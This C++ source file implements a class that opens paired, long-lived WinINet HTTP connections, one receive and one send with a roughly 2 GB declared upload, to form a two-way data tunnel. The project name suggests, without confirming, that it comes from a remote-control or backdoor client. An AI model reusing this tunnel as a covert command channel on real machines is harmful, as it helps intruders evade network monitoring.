// MyHttpPipeBase.cpp: implementation of the CMyHttpPipeBase class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyHttpPipeBase.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyHttpPipeBase::CMyHttpPipeBase()
{

}

CMyHttpPipeBase::~CMyHttpPipeBase()
{
	StopWork();
}

BOOL CMyHttpPipeBase::StartWork(char* m_ServerAddr, int m_ServerPort, 
							 int nSend, int nRecv)
{
	//创建接收管道
	if(!m_PipeRecv.ConnectHttpServer(
		m_ServerAddr, m_ServerPort, nRecv,
		INTERNET_FLAG_PRAGMA_NOCACHE|
		INTERNET_FLAG_NO_CACHE_WRITE|
		INTERNET_FLAG_RELOAD))
	{
		StopWork();
		return FALSE;
	}

	//连接接收管道
	if(!HttpSendRequest(m_PipeRecv.hHttpFp , NULL , 0 , NULL, 0))
	{
		StopWork();
		return FALSE;
	}

	//创建发送管道
	if(!m_PipeSend.ConnectHttpServer(
		m_ServerAddr, m_ServerPort, nSend,
		INTERNET_FLAG_PRAGMA_NOCACHE|
		INTERNET_FLAG_NO_CACHE_WRITE|
		INTERNET_FLAG_RELOAD))
	{
		StopWork();
		return FALSE;
	}

	//连接发送管道
	INTERNET_BUFFERS BufferIn = {0};
    BufferIn.dwStructSize = sizeof( INTERNET_BUFFERS );
	BufferIn.dwBufferTotal = 1024 * 1024 * 1024 + 973741824;
	if(!HttpSendRequestEx(m_PipeSend.hHttpFp,
		&BufferIn,NULL,HSR_INITIATE,0))
	{
		StopWork();
		return FALSE;
	}
	return TRUE;
}

BOOL CMyHttpPipeBase::SendData(char* pData, DWORD nLen)
{
	//发送数据
	DWORD dwBytesWritten = 0;
	if(!InternetWriteFile(m_PipeSend.hHttpFp , 
		pData , nLen , &dwBytesWritten))
		return FALSE;
	return TRUE;
}

BOOL CMyHttpPipeBase::RecvData(char* pData, DWORD nLen)
{
	char *p = (char*) pData;
	DWORD dwNumberOfBytesToRead = nLen;
	DWORD dwNumberOfBytesReaded = 0;
	while(dwNumberOfBytesToRead > 0)
	{
		if(!InternetReadFile(m_PipeRecv.hHttpFp,p,
			dwNumberOfBytesToRead,&dwNumberOfBytesReaded))
			return FALSE;

		if(dwNumberOfBytesReaded == 0)
			return FALSE;

		p += dwNumberOfBytesReaded;
		dwNumberOfBytesToRead -= dwNumberOfBytesReaded;
	}
	return TRUE;
}

void CMyHttpPipeBase::StopWork()
{
	m_PipeRecv.StopWork();
	m_PipeSend.StopWork();
}
